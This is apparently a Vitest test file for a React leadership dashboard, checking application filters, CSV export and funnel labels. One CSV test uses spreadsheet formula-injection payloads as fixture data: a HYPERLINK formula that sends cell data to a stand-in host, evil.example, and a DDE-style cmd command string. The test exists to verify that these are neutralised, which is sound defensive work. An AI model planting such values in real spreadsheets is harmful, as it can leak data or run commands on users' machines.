// Swarm2 — leadership dashboard / applications table. Each test asserts the
// CORRECT behaviour, so a FAIL means the bug is present at 837ccf0.
import React from "react";
import { describe, expect, it, vi, beforeEach } from "vitest";
import { render, screen, waitFor, fireEvent, cleanup } from "@testing-library/react";
import { MemoryRouter, Routes, Route } from "react-router-dom";

vi.mock("../../../hooks/useAuth.jsx", () => ({
  useAuth: () => ({ user: { id: "u1", email: "lead@x.io", roles: ["leadership"] }, logout: () => {} }),
}));
vi.mock("../../../lib/leadershipApi.js", () => ({
  leadershipApi: {
    getStats: vi.fn(),
    getIndustryCategories: vi.fn(),
    listApplications: vi.fn(),
    getApplication: vi.fn(() => new Promise(() => {})),
  },
}));
vi.mock("../../../lib/icDocumentsApi.js", () => ({
  icDocumentsApi: { list: vi.fn(() => Promise.resolve({ documents: [] })) },
}));

import LeadershipDashboard, { buildApplicationsCsv } from "../LeadershipDashboard.jsx";
import { leadershipApi } from "../../../lib/leadershipApi.js";
import { clearStickyState } from "../../../hooks/useStickyState.js";

const mk = (id, over) => ({
  id, track: "tir", native_track: "tir", display_id: `TIR-${id}`, status: "under_review",
  pipeline_stage: "under_review", project_name: `P-${id}`, founder: { name: `F-${id}`, affiliation: "O" },
  industry: { id: "rob", label: "Robotics" }, stage: { label: "Lab" }, ai_score_overall: 7.1,
  submitted_at: "2026-07-01T00:00:00Z", reco: { yes: 0, maybe: 0, no: 0 }, review_count: 0, ...over,
});

let ROWS;
function seed() {
  ROWS = [
    mk("T1", { status: "submitted", pipeline_stage: "submitted" }),
    mk("T2", { status: "submitted", pipeline_stage: "submitted" }),
    mk("T3", { status: "evaluated", pipeline_stage: "reviewed", industry: { id: "cli", label: "Climate" } }),
    mk("T4", { status: "under_review", pipeline_stage: "under_review" }),
    mk("S1", { track: "sip", native_track: "sip", display_id: "VIP-S1", status: "under_review",
      industry: { id: "cli", label: "Climate" } }),
    mk("S2", { track: "sip", native_track: "sip", display_id: "VIP-S2", status: "ai_screening",
      pipeline_stage: "submitted" }),
  ];
}

const SERVER_STAGES = ["reviewed", "gate1_rejected", "final_rejected", "final_pending", "final_selected"];
function backend(p = {}) {
  let rows = ROWS.slice();
  if (p.track) rows = rows.filter((r) => r.track === p.track);
  if (SERVER_STAGES.includes(p.status)) rows = rows.filter((r) => r.pipeline_stage === p.status);
  else if (p.status) rows = rows.filter((r) => r.status === p.status);
  if (p.industry) rows = rows.filter((r) => r.industry?.id === p.industry);
  if (p.search) rows = rows.filter((r) => r.project_name.toLowerCase().includes(p.search.toLowerCase()));
  const off = Number(p.offset || 0); const lim = Number(p.limit || 50);
  return { applications: rows.slice(off, off + lim), total: rows.length, limit: lim, offset: off };
}

const zero = { offered: 0, onboarded: 0, on_hold: 0, waitlisted: 0, withdrawn: 0, gate1_rejected: 0,
  final_pending: 0, final_rejected: 0, final_selected: 0 };
const STATS = {
  totals: { apps_submitted: 6, tir_count: 4, sip_count: 2, avg_ai_score: 7.1 },
  funnel: { profiles: 10, started: 8, submitted: 6, in_review: 2, advanced: 0, decided: 0 },
  ai_score_overalls: [7.1, 7.1, 7.1, 7.1, 7.1, 7.1],
  pipeline_breakdown: {
    total: 6, gate1_selected: 0, rejected_total: 0,
    stages: { ...zero, submitted: 3, under_review: 2, reviewed: 1 },
    by_track: {
      tir: { total: 4, stages: { ...zero, submitted: 2, under_review: 1, reviewed: 1 } },
      sip: { total: 2, stages: { ...zero, submitted: 1, under_review: 1, reviewed: 0 } },
    },
  },
};

function renderDash() {
  return render(
    <MemoryRouter initialEntries={["/leadership"]}>
      <Routes><Route path="/leadership" element={<LeadershipDashboard />} /></Routes>
    </MemoryRouter>,
  );
}
async function openApps() {
  renderDash();
  fireEvent.click(screen.getByRole("button", { name: /^Applications/i }));
  await waitFor(() => expect(screen.getByText("P-T1")).toBeTruthy());
  fireEvent.click(screen.getByRole("button", { name: /Filters/i }));
}
const chip = (re) => screen.getAllByRole("button").find((b) => re.test(b.textContent.trim()));
const chipCount = (re) => Number(chip(re)?.querySelector(".lp-pill-count")?.textContent ?? NaN);

beforeEach(() => {
  vi.clearAllMocks();
  cleanup();
  clearStickyState();
  seed();
  leadershipApi.getStats.mockResolvedValue(STATS);
  leadershipApi.getIndustryCategories.mockResolvedValue({
    categories: [{ id: "rob", label: "Robotics", count: 4 }, { id: "cli", label: "Climate", count: 2 }],
    total: 6, unclassified: { count: 0 },
  });
  leadershipApi.listApplications.mockImplementation((p) => Promise.resolve(backend(p)));
});

describe("CSV export", () => {
  it("neutralises spreadsheet formulas in applicant-controlled cells", () => {
    const row = mk("T9", {
      project_name: '=HYPERLINK("https://evil.example/?x="&A1,"Open")',
      founder: { name: "+cmd|' /C calc'!A0", affiliation: "@SUM(1+1)" },
    });
    const csv = buildApplicationsCsv([row]);
    const line = csv.split("\r\n")[1];
    // Every cell that starts with = + - @ must be prefixed (e.g. with ')
    // so Excel / Sheets treats it as text.
    const cells = line.match(/("([^"]|"")*"|[^,]*)(,|$)/g).map((c) => c.replace(/,$/, "").replace(/^"|"$/g, ""));
    const dangerous = cells.filter((c) => /^[=+\-@]/.test(c));
    expect(dangerous).toEqual([]);
  });

  it("Reco column agrees with the table for a single-review app", () => {
    // Table shows the "1 review" chip; the CSV leaves the cell blank, same as 0 reviews.
    const one = mk("A", { reco: { yes: 1, maybe: 0, no: 0 }, review_count: 1 });
    const none = mk("B", { reco: { yes: 0, maybe: 0, no: 0 }, review_count: 0 });
    const [, l1, l2] = buildApplicationsCsv([one, none]).split("\r\n");
    const recoIdx = 10;
    expect(l1.split(",")[recoIdx]).not.toBe(l2.split(",")[recoIdx]);
  });
});

describe("Dashboard funnel", () => {
  it("'Decided' sub-label names offered (the number includes it) — LEAD-18", async () => {
    renderDash();
    await waitFor(() => expect(screen.getByText("Decided")).toBeTruthy());
    const sub = screen.getByText("Decided").parentElement.querySelector(".lp-funnel-sub").textContent;
    expect(sub).toMatch(/offered/i);
  });
});
